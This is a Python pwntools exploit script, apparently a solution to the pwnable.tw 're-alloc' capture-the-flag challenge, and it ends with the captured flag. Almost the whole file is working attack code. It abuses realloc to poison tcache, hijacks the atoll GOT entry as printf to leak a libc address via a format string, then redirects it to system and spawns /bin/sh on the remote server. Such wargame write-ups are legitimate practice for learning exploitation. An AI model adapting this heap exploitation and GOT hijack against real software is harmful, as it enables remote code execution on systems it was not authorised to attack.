from pwn import *

elf = ELF("re-alloc")
libc = ELF("libc.so")
r = remote("chall.pwnable.tw", 10106)


def alloc(idx, size, data):
    r.recvuntil("Your choice: ")
    r.sendline("1")
    r.recvuntil("Index:")
    r.sendline(str(idx))
    r.recvuntil("Size:")
    r.sendline(str(size))
    r.recvuntil("Data:")
    r.send(data)


def realloc(idx, size, data):
    r.recvuntil("Your choice: ")
    r.sendline("2")
    r.recvuntil("Index:")
    r.sendline(str(idx))
    r.recvuntil("Size:")
    r.sendline(str(size))
    if size != 0:
        r.recvuntil("Data:")
        r.send(data)


def free(idx):
    r.recvuntil("Your choice: ")
    r.sendline("3")
    r.recvuntil("Index:")
    r.sendline(str(idx))


with log.progress("leaking libc_base address") as l:
    alloc(0, 0x18, "AAA")
    realloc(0, 0, "")
    realloc(0, 0x18, p64(elf.got["atoll"]))
    alloc(1, 0x18, "BBB")

    realloc(0, 0x28, "CCC")
    free(0)
    realloc(1, 0x28, "s" * 0x10)
    free(1)

    alloc(0, 0x38, "AAA")
    realloc(0, 0, "")
    realloc(0, 0x38, p64(elf.got["atoll"]))
    alloc(1, 0x38, "BBB")

    realloc(0, 0x48, "CCC")
    free(0)
    realloc(1, 0x48, "s" * 0x10)
    free(1)

    alloc(0, 0x38, p64(elf.plt["printf"]))
    free("%21$llx")

    libc_start_main_ret = int(r.recv(12), 16)
    libc_base = libc_start_main_ret - libc.symbols["__libc_start_main"] - 0xeb
    l.success(hex(libc_base))
    system_addr = libc_base + libc.symbols["system"]
    log.success("system address --> " + hex(system_addr))

r.sendlineafter("Your choice: ", "1")
r.sendlineafter("Index:", "A\x00")
r.sendafter("Size:", "A" * 15 + "\x00")
r.sendafter("Data:", p64(system_addr))
free("/bin/sh\x00")

r.interactive()

# FLAG --> FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}
